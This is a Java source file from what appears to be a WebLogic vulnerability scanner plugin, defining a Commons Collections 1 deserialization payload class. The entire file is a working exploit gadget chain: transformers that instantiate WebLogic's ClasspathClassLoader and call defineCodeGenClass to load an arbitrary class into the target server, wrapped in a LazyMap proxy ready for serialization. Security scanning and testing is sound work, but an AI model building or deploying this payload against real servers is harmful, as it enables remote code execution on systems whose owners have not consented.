package com.gbw.scanner.plugins.scripts.weblogic.payload;

import com.gbw.scanner.utils.ClassFiles;
import com.gbw.scanner.utils.Gadgets;
import com.gbw.scanner.utils.Reflections;
import com.gbw.scanner.utils.Serializer;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import weblogic.utils.classloaders.ClasspathClassLoader;

import java.lang.reflect.InvocationHandler;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;

public class GBWCommonsCollections1 implements GBWEchoPayload<Object> {

    public Object getObject(String version,Class echoClass) throws Exception {
        byte[] buf = ClassFiles.classAsBytes(echoClass);
        final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});
        final Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(ClasspathClassLoader.class),
                new InvokerTransformer("getDeclaredConstructor",
                        new Class[]{Class[].class},
                        new Object[]{new Class[0]}),
                new InvokerTransformer("newInstance",
                        new Class[]{Object[].class},
                        new Object[]{new Object[0]}),
                new InvokerTransformer("defineCodeGenClass",
                        new Class[]{String.class, byte[].class, URL.class}, new Object[]{echoClass.getName(), buf, null}),
                new ConstantTransformer(1)};


        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        final Map mapProxy;

        mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);


        final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);

        Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain

        return handler;
    }



    @Override
    public String getName() {
        return "GBWCommonsCollections1";
    }
}
